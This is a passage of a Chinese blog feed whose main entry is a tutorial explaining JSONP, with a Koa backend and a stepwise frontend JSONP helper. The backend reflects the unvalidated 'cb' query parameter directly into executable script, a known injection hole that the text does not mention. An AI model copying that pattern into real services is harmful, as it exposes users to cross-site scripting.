&#123;</span><br><span class="line">  path: path.resolve(__dirname, <span class="string">&#x27;dist/&#x27;</span>),</span><br><span class="line">  filename: <span class="string">&#x27;assets/[name].js&#x27;</span>,</span><br><span class="line">  assetModuleFilename: <span class="string">&#x27;assets/[name][ext]&#x27;</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>这时候打包一下，预览一下页面，发现都正常引入和使用。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="webpack" scheme="http://aiolimp.com/categories/webpack/"/>
    
    
    <category term="webpack" scheme="http://aiolimp.com/tags/webpack/"/>
    
  </entry>
  
  <entry>
    <title>JSONP 原理及实现</title>
    <link href="http://aiolimp.com/2021/08/02/JSON%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0/"/>
    <id>http://aiolimp.com/2021/08/02/JSON%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0/</id>
    <published>2021-08-02T08:57:49.000Z</published>
    <updated>2023-03-05T13:32:12.206Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="JSONP-原理及实现"><a href="#JSONP-原理及实现" class="headerlink" title="JSONP 原理及实现"></a>JSONP 原理及实现</h1><p>Jsonp(JSON with Padding) 是 json 的一种”使用模式”，可以让网页从别的域名（网站）那获取资料，即跨域读取数据。</p><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>基本原理： 主要就是利用了 <code>script</code> 标签的<code>src</code>没有跨域限制来完成的。</p><h3 id="执行过程"><a href="#执行过程" class="headerlink" title="执行过程"></a>执行过程</h3><p>执行过程：</p><ul><li>前端定义一个解析函数(如: <code>jsonpCallback = function (res) &#123;&#125;</code>)</li><li>通过<code>params</code>的形式包装<code>script</code>标签的请求参数，并且声明执行函数(如<code>cb=jsonpCallback</code>)</li><li>后端获取到前端声明的执行函数(<code>jsonpCallback</code>)，并以带上参数且调用执行函数的方式传递给前端</li><li>前端在<code>script</code>标签返回资源的时候就会去执行<code>jsonpCallback</code>并通过回调函数的方式拿到数据了。</li></ul><h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><p>缺点：</p><ul><li>只能进行<code>GET</code>请求</li></ul><p>优点：</p><ul><li>兼容性好，在一些古老的浏览器中都可以运行</li></ul><h3 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h3><p>先来看看我们要实现一个什么效果：</p><p>在一个叫<code>index.html</code>的文件中有以下代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">window</span>.jsonpCallback = <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(res);</span></span><br><span class="line">  &#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&lt;script</span><br><span class="line">  src=&quot;http://localhost:8080/api/jsonp?id=1&amp;cb=jsonpCallback&quot;</span><br><span class="line">  type=&quot;text/javascript&quot;</span><br><span class="line">&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后我本地有一个文件<code>server.js</code>它会使用<code>node</code>提供一个服务，来模拟服务器。</p><p>并且定义一个接口<code>/api/jsonp</code>来查询<code>id</code>对应的数据。</p><p>当我打开<code>index.html</code>的时候就会加载<code>script</code>标签，并执行了此次跨域请求。</p><h4 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h4><ul><li>我在本地新建一个文件夹<code>node-cors</code></li><li>并在此目录下<code>npm init</code>，初始化<code>package.json</code></li><li>安装<code>koa</code>(<code>node</code>的一个轻量级框架)</li><li>新建文件夹<code>jsonp</code>，并新建<code>index.html</code>和<code>server.js</code>，一个写前端代码，一个写后端</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mkdir node-cors &amp;&amp; <span class="built_in">cd</span> node-cors</span><br><span class="line">npm init</span><br><span class="line">cnpm i --save-dev koa</span><br><span class="line">mkdir jsonp &amp;&amp; <span class="built_in">cd</span> jsonp</span><br><span class="line">touch index.html</span><br><span class="line">touch server.js</span><br></pre></td></tr></table></figure><h4 id="后端代码"><a href="#后端代码" class="headerlink" title="后端代码"></a>后端代码</h4><p>由于<code>JSONP</code>的实现需要前后端配合，先来写一下后端的实现：</p><p>（看不懂没关系，下面的<strong>前端简单实现</strong>会做解释）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">&quot;koa&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Koa();</span><br><span class="line"><span class="keyword">const</span> items = [</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">title</span>: <span class="string">&quot;title1&quot;</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">2</span>, <span class="attr">title</span>: <span class="string">&quot;title2&quot;</span> &#125;,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">app.use(<span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (ctx.path === <span class="string">&quot;/api/jsonp&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; cb, id &#125; = ctx.query;</span><br><span class="line">    <span class="keyword">const</span> title = items.find(<span class="function">(<span class="params">item</span>) =&gt;</span> item.id == id)[<span class="string">&quot;title&quot;</span>];</span><br><span class="line">    ctx.body = <span class="string">`<span class="subst">$&#123;cb&#125;</span>(<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(&#123; title &#125;)&#125;</span>)`</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;listen 8080...&quot;</span>);</span><br><span class="line">app.listen(<span class="number">8080</span>);</span><br></pre></td></tr></table></figure><p>写完之后，保存。</p><p>并在<code>jsonp</code>这个文件夹下执行：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node server<span class="selector-class">.js</span></span><br></pre></td></tr></table></figure><p>来启动服务，可以看到编辑器的控制台中会打印出<code>&quot;listen 8080...&quot;</code></p><h4 id="前端简单实现"><a href="#前端简单实现" class="headerlink" title="前端简单实现"></a>前端简单实现</h4><p>OK👌，后端已经实现了，现在让我们来看看前端最简单的一种实现方式，也就是写死一个<code>script</code>并发送请求：</p><p><code>index.html</code>中：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">window</span>.jsonpCallback = <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(res);</span></span><br><span class="line">  &#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&lt;script</span><br><span class="line">  src=&quot;http://localhost:8080/api/jsonp?id=1&amp;cb=jsonpCallback&quot;</span><br><span class="line">  type=&quot;text/javascript&quot;</span><br><span class="line">&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这两个<code>script</code>的意思是：</p><ul><li>第一个，创建一个<code>jsonpCallback</code>函数。但是它还没有被调用</li><li>第二个，加载<code>src</code>中的资源，并等待请求的内容返回</li></ul><p>整个过程就是：</p><ol><li>当执行到第二个<code>script</code>的时候，由于请求了我们的<code>8080</code>端口，并且把<code>id</code>和<code>cb</code>这两个参数放到<code>URL</code>里。那么后台就可以拿到<code>URL</code>里的这两个参数。</li><li>也就是在<strong>后端代码</strong>中的<code>const &#123; id, cb &#125; = ctx.query</code>这里获取到了。</li><li>那么后端在拿到这两个参数之后，可能就会根据<code>id</code>来进行一些查询，当然，我这里只是模拟的查询，用了一个简单的<code>find</code>来进行一个查找。查找到<code>id</code>为<code>1</code>的那项并且取<code>title</code>。</li><li>第二个参数<code>cb</code>，拿到的就是<code>&quot;jsonpCallback&quot;</code>了，这里也就是告诉后端，前端那里是会有一个叫做<code>jsonpCallback</code>的函数来接收后端想要返回的数据，而后端你只需要在返回体中写入<code>jsonpCallback()</code>就可以了。</li><li>前端在得到了后端返回的内容<code>jsonpCallback(&#123;&quot;title&quot;:&quot;title1&quot;&#125;)</code>，发现里面是一段执行函数的语句，因此就会去执行第一个<code>script</code>中的<code>jsonpCallback</code>方法了，并且又是带了参数的，所以此时浏览器控制台会打印出<code>&#123; title: &#39;title1&#39; &#125;</code></li></ol><p>以此来达到一个简单的跨域的效果。</p><p>其实你想想，如果我们把第二个<code>script</code>标签换成以下代码，是不是也能达到同样的效果呢？</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- &lt;script src=&#x27;http://localhost:8080/api/jsonp?id=1&amp;cb=jsonpCallback&#x27; type=&#x27;text/javascript&#x27;&gt;&lt;/script&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">  jsonpCallback(&#123; <span class="attr">title</span>: <span class="string">&quot;title1&quot;</span> &#125;);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="封装一个-JSONP-方法"><a href="#封装一个-JSONP-方法" class="headerlink" title="封装一个 JSONP 方法"></a>封装一个 JSONP 方法</h3><p>（此章会一步一步教你如何封装一个比较完美的<code>JSONP</code>方法）</p><h4 id="简易版"><a href="#简易版" class="headerlink" title="简易版"></a>简易版</h4><p>先看下我们要实现的功能</p><p>定义一个<code>JSONP</code>方法，它接收四个参数：</p><ul><li>url</li><li>params</li><li>callbackKey：与后台约定的回调函数是用哪个字段(如<code>cb</code>)</li><li>callback：拿到数据之后执行的回调函数</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="function"><span class="keyword">function</span> <span class="title">JSONP</span>(<span class="params">&#123; url, params = &#123;&#125;, callbackKey = <span class="string">&quot;cb&quot;</span>, callback &#125;</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 定义本地的一个callback的名称</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> callbackName = <span class="string">&quot;jsonpCallback&quot;</span>;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 把这个名称加入到参数中: &#x27;cb=jsonpCallback&#x27;</span></span></span><br><span class="line">    params[callbackKey] = callbackName;</span><br><span class="line"><span class="javascript">    <span class="comment">//  把这个callback加入到window对象中，这样就能执行这个回调了</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>[callbackName] = callback;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">// 得到&#x27;id=1&amp;cb=jsonpCallback&#x27;</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> paramString = <span class="built_in">Object</span>.keys(params)</span></span><br><span class="line"><span class="javascript">      .map(<span class="function">(<span class="params">key</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;key&#125;</span>=<span class="subst">$&#123;params[key]&#125;</span>`</span>;</span></span><br><span class="line">      &#125;)</span><br><span class="line"><span class="javascript">      .join(<span class="string">&quot;&amp;&quot;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 创建 script 标签</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> script = <span class="built_in">document</span>.createElement(<span class="string">&quot;script&quot;</span>);</span></span><br><span class="line"><span class="javascript">    script.setAttribute(<span class="string">&quot;src&quot;</span>, <span class="string">`<span class="subst">$&#123;url&#125;</span>?<span class="subst">$&#123;paramString&#125;</span>`</span>);</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.body.appendChild(script);</span></span><br><span class="line">  &#125;</span><br><span class="line">  JSONP(&#123;</span><br><span class="line"><span class="javascript">    url: <span class="string">&quot;http://localhost:8080/api/jsonp&quot;</span>,</span></span><br><span class="line">    params: &#123; id: 1 &#125;,</span><br><span class="line"><span class="javascript">    callbackKey: <span class="string">&quot;cb&quot;</span>,</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">callback</span>(<span class="params">res</span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">console</span>.log(res);</span></span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样写打开页面也可是可以看到效果的。</p><h4 id="同时多个请求"><a href="#同时多个请求" class="headerlink" title="同时多个请求"></a>同时多个请求</h4><p>上面我们虽然实现了<code>JSONP</code>，但有一个问题，那就是如果我同时多次调用<code>JSONP</code>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">JSONP(&#123;</span><br><span class="line">  url: <span class="string">&quot;http://localhost:8080/api/jsonp&quot;</span>,</span><br><span class="line">  params: &#123; <span class="attr">id</span>: <span class="number">1</span> &#125;,</span><br><span class="line">  callbackKey: <span class="string">&quot;cb&quot;</span>,</span><br><span class="line">  <span class="function"><span class="title">callback</span>(<span class="params">res</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res); <span class="comment">// No.1</span></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br><span class="line">JSONP(&#123;</span><br><span class="line">  url: <span class="string">&quot;http://localhost:8080/api/jsonp&quot;</span>,</span><br><span class="line">  params: &#123; <span class="attr">id</span>: <span class="number">2</span> &#125;,</span><br><span class="line">  callbackKey: <span class="string">&quot;cb&quot;</span>,</span><br><span class="line">  <span class="function"><span class="title">callback</span>(<span class="params">res</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res); <span class="comment">// No.2</span></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>可以看到这里我调用了两次<code>JSONP</code>，只是传递的参数不同。但是并不会按我们预期的在<code>No.1和No.2</code>中分别打印，而是都会在<code>No.2</code>中打印出结果。这是因为后面一个<code>callback</code>把<code>JSONP</code>里封装的第一个<code>callback</code>给覆盖了，它们都是共用的同一个<code>callbackName</code>，也就是<code>jsonpCallback</code>。如下所示：</p><p><img src="https://upload-images.jianshu.io/upload_images/7190596-cc120b40bca81408.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/315/format/webp" alt="img"></p><p>两次结果都是从<code>76</code>行打印出来的。</p><p>所以我们得改造一下上面的<code>JSONP</code>方法：</p><ul><li>让<code>callbackName</code>是一个唯一的，可以使用递增</li><li>不要把回调定义在<code>window</code>中这样会污染全局变量，可以把它扔到<code>JSON.xxx</code>中</li></ul><p>OK👌，来看看改造之后的代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">JSONP</span>(<span class="params">&#123;</span></span></span></span><br><span class="line">        url,</span><br><span class="line">        params = &#123;&#125;,</span><br><span class="line"><span class="javascript">        callbackKey = <span class="string">&#x27;cb&#x27;</span>,</span></span><br><span class="line">        callback</span><br><span class="line">    &#125;) &#123;</span><br><span class="line"><span class="javascript">        <span class="comment">// 定义本地的唯一callbackId，若是没有的话则初始化为1</span></span></span><br><span class="line">        JSONP.callbackId = JSONP.callbackId || 1;</span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> callbackId = JSONP.callbackId;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 把要执行的回调加入到JSON对象中，避免污染window</span></span></span><br><span class="line">        JSONP.callbacks = JSONP.callbacks || [];</span><br><span class="line">        JSONP.callbacks[callbackId] = callback;</span><br><span class="line"><span class="javascript">        <span class="comment">// 把这个名称加入到参数中: &#x27;cb=JSONP.callbacks[1]&#x27;</span></span></span><br><span class="line"><span class="javascript">        params[callbackKey] = <span class="string">`JSONP.callbacks[<span class="subst">$&#123;callbackId&#125;</span>]`</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">// 得到&#x27;id=1&amp;cb=JSONP.callbacks[1]&#x27;</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> paramString = <span class="built_in">Object</span>.keys(params).map(<span class="function"><span class="params">key</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;key&#125;</span>=<span class="subst">$&#123;params[key]&#125;</span>`</span></span></span><br><span class="line"><span class="javascript">        &#125;).join(<span class="string">&#x27;&amp;&#x27;</span>)</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 创建 script 标签</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> script = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        script.setAttribute(<span class="string">&#x27;src&#x27;</span>, <span class="string">`<span class="subst">$&#123;url&#125;</span>?<span class="subst">$&#123;paramString&#125;</span>`</span>);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.body.appendChild(script);</span></span><br><span class="line"><span class="javascript">        <span class="comment">// id自增，保证唯一</span></span></span><br><span class="line">        JSONP.callbackId++;</span><br><span class="line">    &#125;</span><br><span class="line">    JSONP(&#123;</span><br><span class="line"><span class="javascript">        url: <span class="string">&#x27;http://localhost:8080/api/jsonp&#x27;</span>,</span></span><br><span class="line">        params: &#123; id: 1 &#125;,</span><br><span class="line"><span class="javascript">        callbackKey: <span class="string">&#x27;cb&#x27;</span>,</span></span><br><span class="line">        callback (res) &#123;</span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(res)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    JSONP(&#123;</span><br><span class="line"><span class="javascript">        url: <span class="string">&#x27;http://localhost:8080/api/jsonp&#x27;</span>,</span></span><br><span class="line">        params: &#123; id: 2 &#125;,</span><br><span class="line"><span class="javascript">        callbackKey: <span class="string">&#x27;cb&#x27;</span>,</span></span><br><span class="line">        callback (res) &#123;</span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(res)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到现在调用了两次回调，但是会分别执行<code>JSONP.callbacks[1]</code>和<code>JSONP.callbacks[2]</code>：</p><p><img src="https://upload-images.jianshu.io/upload_images/7190596-da503e93793f5f65.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/394/format/webp" alt="img"></p><h4 id="最终版-JSONP-方法"><a href="#最终版-JSONP-方法" class="headerlink" title="最终版 JSONP 方法"></a>最终版 JSONP 方法</h4><p>其实上面已经算比较完美了，但是还会有一个小问题，比如下面这种情况：</p><p>我改一下后端的代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">&#x27;koa&#x27;</span>);<span class="keyword">const</span> app = <span class="keyword">new</span> Koa();<span class="keyword">const</span> items = [&#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">title</span>: <span class="string">&#x27;title1&#x27;</span> &#125;, &#123; <span class="attr">id</span>: <span class="number">2</span>, <span class="attr">title</span>: <span class="string">&#x27;title2&#x27;</span> &#125;]app.use(<span class="keyword">async</span> (ctx, next) =&gt; &#123;  <span class="keyword">if</span> (ctx.path === <span class="string">&#x27;/api/jsonp&#x27;</span>) &#123;    <span class="keyword">const</span> &#123; cb, id &#125; = ctx.query;    <span class="keyword">const</span> title = items.find(<span class="function"><span class="params">item</span> =&gt;</span> item.id == id)[<span class="string">&#x27;title&#x27;</span>]    ctx.body = <span class="string">`<span class="subst">$&#123;cb&#125;</span>(<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(&#123;title&#125;)&#125;</span>)`</span>;    <span class="keyword">return</span>;  &#125;  <span class="keyword">if</span> (ctx.path === <span class="string">&#x27;/api/jsonps&#x27;</span>) &#123;    <span class="keyword">const</span> &#123; cb, a, b &#125; = ctx.query;    ctx.body = <span class="string">`<span class="subst">$&#123;cb&#125;</span>(<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(&#123; a, b &#125;)&#125;</span>)`</span>;    <span class="keyword">return</span>;  &#125;&#125;)<span class="built_in">console</span>.log(<span class="string">&#x27;listen 8080...&#x27;</span>)app.listen(<span class="number">8080</span>);</span><br></pre></td></tr></table></figure><p>增加了一个<code>/api/jsonps</code>的接口。</p><p>然后前端代码增加了一个这样的请求：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">JSONP(&#123;</span><br><span class="line">  url: <span class="string">&quot;http://localhost:8080/api/jsonps&quot;</span>,</span><br><span class="line">  params: &#123; <span class="attr">a</span>: <span class="string">&quot;2&amp;b=3&quot;</span>, <span class="attr">b</span>: <span class="string">&quot;4&quot;</span> &#125;,</span><br><span class="line">  callbackKey: <span class="string">&quot;cb&quot;</span>,</span><br><span class="line">  <span class="function"><span class="title">callback</span>(<span class="params">res</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>可以看到，参数的<code>a</code>中也会有<code>b</code>这个字符串，这样就导致我们获取到的数据不对了：</p><p><img src="https://upload-images.jianshu.io/upload_images/7190596-3a83392ae9dab76f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/325/format/webp" alt="img"></p><p>jsonp1.png</p><p>后台并不知道<code>a</code>的参数是一个字符串，它只会按照<code>&amp;</code>来截取参数。</p><p>所以为了解决这个问题，可以使用<strong>URI 编码</strong>。</p><p>也就是使用：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">encodeURIComponent</span>(<span class="string">&quot;2&amp;b=3&quot;</span>); <span class="comment">// 结果为&quot;2%26b%3D3&quot;</span></span><br></pre></td></tr></table></figure><p>只需要改一下<code>JSONP</code>方法中参数的生成：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 得到&#x27;id=1&amp;cb=JSONP.callbacks[1]&#x27;const paramString = Object.keys(params).map(key =&gt; &#123;    return `$&#123;key&#125;=$&#123;encodeURIComponent(params[key])&#125;`&#125;).join(&#x27;&amp;&#x27;)</span></span><br></pre></td></tr></table></figure><p>来看一下完整版的<code>JSONP</code>方法：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">JSONP</span>(<span class="params">&#123;</span></span></span></span><br><span class="line">        url,</span><br><span class="line">        params = &#123;&#125;,</span><br><span class="line"><span class="javascript">        callbackKey = <span class="string">&#x27;cb&#x27;</span>,</span></span><br><span class="line">        callback</span><br><span class="line">    &#125;) &#123;</span><br><span class="line"><span class="javascript">        <span class="comment">// 定义本地的唯一callbackId，若是没有的话则初始化为1</span></span></span><br><span class="line">        JSONP.callbackId = JSONP.callbackId || 1;</span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> callbackId = JSONP.callbackId;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 把要执行的回调加入到JSON对象中，避免污染window</span></span></span><br><span class="line">        JSONP.callbacks = JSONP.callbacks || [];</span><br><span class="line">        JSONP.callbacks[callbackId] = callback;</span><br><span class="line"><span class="javascript">        <span class="comment">// 把这个名称加入到参数中: &#x27;cb=JSONP.callbacks[1]&#x27;</span></span></span><br><span class="line"><span class="javascript">        params[callbackKey] = <span class="string">`JSONP.callbacks[<span class="subst">$&#123;callbackId&#125;</span>]`</span>;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 得到&#x27;id=1&amp;cb=JSONP.callbacks[1]&#x27;</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> paramString = <span class="built_in">Object</span>.keys(params).map(<span class="function"><span class="params">key</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span 